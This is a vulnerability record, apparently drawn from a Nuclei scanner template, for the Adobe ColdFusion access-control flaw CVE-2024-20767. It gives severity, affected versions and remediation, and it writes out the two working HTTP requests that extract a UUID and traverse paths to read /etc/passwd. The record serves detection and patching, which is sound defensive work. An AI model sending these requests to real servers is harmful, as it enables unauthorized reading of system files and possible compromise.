---
cve_id: CVE-2024-20767
template_path: nuclei-templates/http/cves/2024/CVE-2024-20767.yaml
affected_product: Adobe ColdFusion
severity: high
authentication: none
external_callback: false
affected_versions: 2023.6, 2021.12 and earlier
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Adobe ColdFusion versions 2023.6, 2021.12 and earlier are affected by an Improper Access Control (CWE-284) vulnerability that allows unauthenticated arbitrary file-system read (and write) via path-traversal bypass.  
CVSS 3.1: 8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N).  
Unauthenticated remote attackers can read sensitive files (e.g. /etc/passwd) and write arbitrary files without user interaction, leading to full system compromise.  
Remediation: upgrade to 2023.7 / 2021.13 or later.

## PoC / Detection
Classification: info-leak

The template executes a two-request chain to verify the flaw:  
1. `GET /hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat` extracts a UUID value from the returned WDDX packet.  
2. `GET /hax/../pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000` (with extracted UUID in the `uuid` header) triggers path traversal through the logging module and returns the target file.  

Matchers confirm success when the first body contains `wddxPacket`, the second response header is `application/json`, and the second body contains `/bin/bash` (signature of a successful Linux /etc/passwd read).

## References
- https://jeva.cc/2973.html
- https://nvd.nist.gov/vuln/detail/CVE-2024-20767
- https://helpx.adobe.com/security/products/coldfusion/apsb24-14.html
- https://github.com/Praison001/CVE-2024-20767-Adobe-ColdFusion
- https://github.com/Hatcat123/my_stars
